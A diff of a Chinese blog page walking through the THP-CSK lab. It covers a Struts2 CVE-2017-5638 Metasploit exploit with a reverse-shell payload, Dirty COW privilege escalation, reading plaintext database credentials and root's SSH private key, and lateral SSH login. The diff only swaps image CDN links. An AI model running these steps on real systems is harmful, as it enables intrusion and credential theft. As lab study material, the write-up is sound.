@@ -51,7 +51,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://wr0ld.github.io/avatar.png">
 <meta property="article:published_time" content="2026-03-24T04:00:00.000Z">
-<meta property="article:modified_time" content="2026-05-14T10:04:40.432Z">
+<meta property="article:modified_time" content="2026-05-14T13:37:56.038Z">
 <meta property="article:author" content="wr0ld">
 <meta property="article:tag" content="靶机渗透">
 <meta property="article:tag" content="提权">
@@ -68,7 +68,7 @@
   <!-- feed -->
   
 
-  <link rel="stylesheet" href="/css/main.css?v=mp5bt8m7">
+  <link rel="stylesheet" href="/css/main.css?v=mp5jbj9s">
 
 
   
@@ -77,7 +77,7 @@
 
   
 
-  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-03-24T12:00:00+08:00","dateModified":"2026-05-14T18:04:40+08:00","datePublished":"2026-03-24T12:00:00+08:00","description":"","headline":"THP-CSK 靶场 Linux 内网横向渗透全流程","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/5532e4a/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/5532e4a/","keywords":"靶机渗透, 提权, 内网渗透, 横向移动, Jenkins","thumbnailUrl":"/images/THP.png","image":1}</script>
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"wr0ld","sameAs":[],"image":"/avatar.png"},"dateCreated":"2026-03-24T12:00:00+08:00","dateModified":"2026-05-14T21:37:56+08:00","datePublished":"2026-03-24T12:00:00+08:00","description":"","headline":"THP-CSK 靶场 Linux 内网横向渗透全流程","mainEntityOfPage":{"@type":"WebPage","@id":"https://wr0ld.github.io/posts/5532e4a/"},"publisher":{"@type":"Organization","name":"wr0ld","sameAs":[],"image":"/avatar.png","logo":{"@type":"ImageObject","url":"/avatar.png"}},"url":"https://wr0ld.github.io/posts/5532e4a/","keywords":"靶机渗透, 提权, 内网渗透, 横向移动, Jenkins","thumbnailUrl":"/images/THP.png","image":1}</script>
   
 </head>
 <body><div class="reading-progress-bar"></div>
@@ -123,7 +123,7 @@
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wrold/p/19748562">https://www.cnblogs.com/wrold/p/19748562</a></p>
 </blockquote>
 <hr>
-<h2 id="📋-靶场概述"><a href="#📋-靶场概述" class="headerlink" title="📋 靶场概述"></a>📋 靶场概述</h2><p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image1.png"></p>
+<h2 id="📋-靶场概述"><a href="#📋-靶场概述" class="headerlink" title="📋 靶场概述"></a>📋 靶场概述</h2><p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image1.png"></p>
 <p>本次靶场共三台 Linux 主机，模拟一个典型的企业内网”站库分离”架构：</p>
 <table>
 <thead>
@@ -158,17 +158,17 @@
 <hr>
 <h2 id="📥-靶场文件下载"><a href="#📥-靶场文件下载" class="headerlink" title="📥 靶场文件下载"></a>📥 靶场文件下载</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://secplanet.sfo2.cdn.digitaloceanspaces.com/THP-csk-lab.zip</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image2.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image2.png"></p>
 <hr>
 <h2 id="🔧-环境搭建"><a href="#🔧-环境搭建" class="headerlink" title="🔧 环境搭建"></a>🔧 环境搭建</h2><p><strong>VMware 路径：</strong> 编辑 → 虚拟网络编辑器 → 更改设置</p>
 <p>修改子网 IP 为 <code>172.16.250.0</code>，类型保持”段内可通讯”即可，用来模拟内网隔离环境。</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image3.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image3.png"></p>
 <hr>
 <h2 id="🔍-信息收集"><a href="#🔍-信息收集" class="headerlink" title="🔍 信息收集"></a>🔍 信息收集</h2><p>打开三台虚拟主机，先扫一下存活主机：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 172.16.250.0/24</span><br></pre></td></tr></table></figure>
 
 <p>刚好三台，符合预期。</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image4.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image4.png"></p>
 <p>然后对这三台机器做全端口详细扫描：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -p- 172.16.250.10 172.16.250.30 172.16.250.50</span><br></pre></td></tr></table></figure>
 
@@ -201,31 +201,31 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.250.10/</span><br></pre></td></tr></table></figure>
 
 <p>跑的是 OpenCms：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image5.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image5.png"></p>
 <p><strong>访问 8080 端口：</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.250.10:8080/</span><br></pre></td></tr></table></figure>
 
 <p>标准的 Tomcat 页面：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image6.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image6.png"></p>
 <p>尝试在 Kali 上搜 OpenCms 的漏洞：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit opencms</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image7.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image7.png"></p>
 <p>基本都是 XXE 文件读取，没什么直接 RCE 的利用，先搁置。</p>
 <p>再跑一下目录：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://172.16.250.10/</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image8.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image8.png"></p>
 <p>也没发现啥有用的。到这里其实有点没头绪，后来翻 WP 才知道有这么一个路径：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.250.10/struts2-showcase/showcase.action</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image9.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image9.png"></p>
 <p>这是 <strong>Struts2 Showcase Demo</strong>，官方演示程序，很多靶场都会装这个当入口。看到这个基本就知道该怎么打了。</p>
 <hr>
 <h2 id="💥-漏洞利用：Struts2-RCE（CVE-2017-5638）"><a href="#💥-漏洞利用：Struts2-RCE（CVE-2017-5638）" class="headerlink" title="💥 漏洞利用：Struts2 RCE（CVE-2017-5638）"></a>💥 漏洞利用：Struts2 RCE（CVE-2017-5638）</h2><p>打开 MSF，搜 Struts2：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search struts2</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image10.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image10.png"></p>
 <p>选用模块：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/http/struts2_content_type_ognl</span><br></pre></td></tr></table></figure>
 
@@ -233,15 +233,15 @@
 <p>📌 对应漏洞：<strong>CVE-2017-5638</strong>，通过 Content-Type 头注入 OGNL 表达式实现远程代码执行。</p>
 </blockquote>
 <p>注意默认 payload 是 Windows 的：</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image11.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image11.png"></p>
 <p>目标是 Linux，要手动切换：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> payload linux/x86/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> RHOSTS 172.16.250.10</span><br><span class="line"><span class="built_in">set</span> RPORT 80</span><br><span class="line">show options</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image12.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image12.png"></p>
 <p>配置没问题，直接打：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run</span><br><span class="line">getuid</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image13.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image13.png"></p>
 <p>✅ 成功拿到 <code>tomcat</code> 权限，下一步是提权到 root。</p>
 <hr>
 <h2 id="⬆️-提权"><a href="#⬆️-提权" class="headerlink" title="⬆️ 提权"></a>⬆️ 提权</h2><p>先获取交互式 Shell：</p>
@@ -250,70 +250,70 @@
 <blockquote>
 <p>⚠️ 注意：这台机器没有 <code>python</code>，只有 <code>python3</code>。</p>
 </blockquote>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image14.png"></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image15.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image14.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image15.png"></p>
 <p>或者用这个也行：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script -qc /bin/bash /dev/null</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image16.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image16.png"></p>
 <p>方法很多，选一个能用的就行。</p>
 <h3 id="🔎-提权侦察"><a href="#🔎-提权侦察" class="headerlink" title="🔎 提权侦察"></a>🔎 提权侦察</h3><p>先找 SUID 文件：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
 
 <p>没啥能用的。</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image17.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image17.png"></p>
 <p>试一下 sudo：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> -l</span><br></pre></td></tr></table></figure>
 
 <p>需要密码，跳过。</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image18.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image18.png"></p>
 <p>查内核版本，看看有没有内核漏洞可以打：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">uname</span> -a</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image19.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image19.png"></p>
 <hr>
 <h3 id="❌-尝试-overlayfs（失败）"><a href="#❌-尝试-overlayfs（失败）" class="headerlink" title="❌ 尝试 overlayfs（失败）"></a>❌ 尝试 overlayfs（失败）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit overlayfs</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image20.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image20.png"></p>
 <p>复制利用代码：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m linux/local/37292.c</span><br></pre></td></tr></table></figure>
 
 <p>退回 MSF session，上传文件：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload 37292.c /tmp/37292.c</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image21.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image21.png"></p>
 <p>编译并执行：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc 37292.c -o exp</span><br><span class="line"><span class="built_in">chmod</span> 777 ./exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image22.png"></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image23.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image22.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image23.png"></p>
 <p>有警告但能编译。结果执行发现不适配当前内核环境，宣告失败。</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image24.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image24.png"></p>
 <hr>
-<h3 id="❌-Metasploit-overlayfs-模块（失败）"><a href="#❌-Metasploit-overlayfs-模块（失败）" class="headerlink" title="❌ Metasploit overlayfs 模块（失败）"></a>❌ Metasploit overlayfs 模块（失败）</h3><p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image25.png"></p>
+<h3 id="❌-Metasploit-overlayfs-模块（失败）"><a href="#❌-Metasploit-overlayfs-模块（失败）" class="headerlink" title="❌ Metasploit overlayfs 模块（失败）"></a>❌ Metasploit overlayfs 模块（失败）</h3><p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image25.png"></p>
 <blockquote>
 <p>📌 模块：<code>40688.rb</code></p>
 </blockquote>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/linux/local/overlayfs_priv_esc</span><br><span class="line">background</span><br><span class="line"><span class="built_in">set</span> SESSION 1</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image26.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image26.png"></p>
 <p>同样失败，这台机器的内核版本就是不吃这套。</p>
 <hr>
 <h3 id="❌-Dirty-COW-40839（失败，机器崩了）"><a href="#❌-Dirty-COW-40839（失败，机器崩了）" class="headerlink" title="❌ Dirty COW 40839（失败，机器崩了）"></a>❌ Dirty COW 40839（失败，机器崩了）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchsploit dirty cow</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image27.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image27.png"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m linux/local/40839.c</span><br><span class="line">sessions 1</span><br><span class="line">upload 40839.c /tmp/</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image28.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image28.png"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">gcc 40839.c -o cow -lcrypt -lpthread</span><br><span class="line"><span class="built_in">chmod</span> +x cow</span><br><span class="line">./cow</span><br></pre></td></tr></table></figure>
 
 <p>输入密码 <code>123456</code> 后 <code>su firefart</code>……又崩了。</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image29.png"></p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image30.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image29.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image30.png"></p>
 <hr>
 <h3 id="✅-Dirty-COW-40616（成功！）"><a href="#✅-Dirty-COW-40616（成功！）" class="headerlink" title="✅ Dirty COW 40616（成功！）"></a>✅ Dirty COW 40616（成功！）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">searchsploit -m linux/local/40616.c</span><br><span class="line">upload 40616.c /tmp/</span><br><span class="line">shell</span><br><span class="line">python3 -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">gcc 40616.c -o cowroot -pthread</span><br><span class="line"><span class="built_in">chmod</span> +x cowroot</span><br><span class="line">./cowroot</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image31.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image31.png"></p>
 <p>🎉 成功提权！</p>
 <p>执行完之后，建议立刻运行以下命令<strong>保持利用稳定</strong>，不然系统很容易随机崩掉：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/vm/dirty_writeback_centisecs</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/panic</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/panic_on_oops</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/panic_on_unrecovered_nmi</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/panic_on_io_nmi</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/panic_on_warn</span><br></pre></td></tr></table></figure>
@@ -322,17 +322,17 @@
 <p>⚠️ <strong>千万别一次性全部复制粘贴执行！</strong> 一条一条来，否则可能造成系统崩溃。</p>
 </blockquote>
 <p>关于把自己主机干蓝屏这件事……（doge）</p>
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image32.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image32.png"></p>
 <hr>
 <h2 id="🔎-内网信息收集"><a href="#🔎-内网信息收集" class="headerlink" title="🔎 内网信息收集"></a>🔎 内网信息收集</h2><p>提权成功后，先看看网卡信息：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image33.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image33.png"></p>
 <p>只有一个网段，确认网络拓扑。</p>
 <p>然后去翻一下应用配置文件，找数据库连接信息：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /opt/tomcat/webapps/kittens/WEB-INF/config/opencms.properties</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image34.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image34.png"></p>
 <p>找到了关键信息：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># WEB站点</span><br><span class="line">IP地址：172.16.250.10</span><br><span class="line">端口号：80</span><br><span class="line"></span><br><span class="line"># 数据库</span><br><span class="line">IP地址：172.16.250.50</span><br><span class="line">端口号：3306</span><br><span class="line"></span><br><span class="line"># 站库分离</span><br><span class="line">账号密码：store / WTWOIUEfjSLeij</span><br></pre></td></tr></table></figure>
 
@@ -342,39 +342,39 @@
 <p>翻一下历史命令，找到SSH 连接记录：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/.bash_history</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image35.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image35.png"></p>
 <p>发现有 SSH 连接记录，再去读一下密钥：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image36.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image36.png"></p>
 <p>复制 SSH 私钥到本地（保存为 <code>ssh.txt</code>），尝试免密登录 .30 机器：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i ssh.txt root@172.16.250.30</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.statically.io/gh/wr0ld/BlogImage/main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image37.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/THP-CSK%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91_image37.png"></p>
 <p>✅ 成功登录 <code>.30</code> 机器！</p>
 <hr>
